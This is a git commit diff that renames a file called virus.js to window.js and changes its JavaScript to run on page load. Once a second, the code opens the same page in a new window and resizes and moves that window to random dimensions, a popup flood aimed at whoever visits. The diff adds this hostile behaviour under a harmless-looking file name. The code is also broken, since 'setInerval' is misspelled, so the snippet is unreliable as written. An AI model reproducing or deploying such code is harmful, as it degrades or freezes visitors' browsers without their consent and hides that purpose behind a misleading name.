5362390d5ca1cc5e4d762c60dfe6fd05938d7d13
ChessAITest <147644008+ChessAITest@users.noreply.github.com>
2024-01-11 07:37:28 -0500

    Update and rename virus.js to window.js

--- window.js
+++ window.js
@@ -1,5 +1,8 @@
 var win;
+window.addEventListener('load', function(){
 setInerval(function(){
 win = window.open(location.href);
 win.resizeTo(Math.random() * screen.width, Math.random() * screen.height);
+win.moveTo(Math.random() * screen.width, Math.random() * screen.height);
 }, 1000);
+});
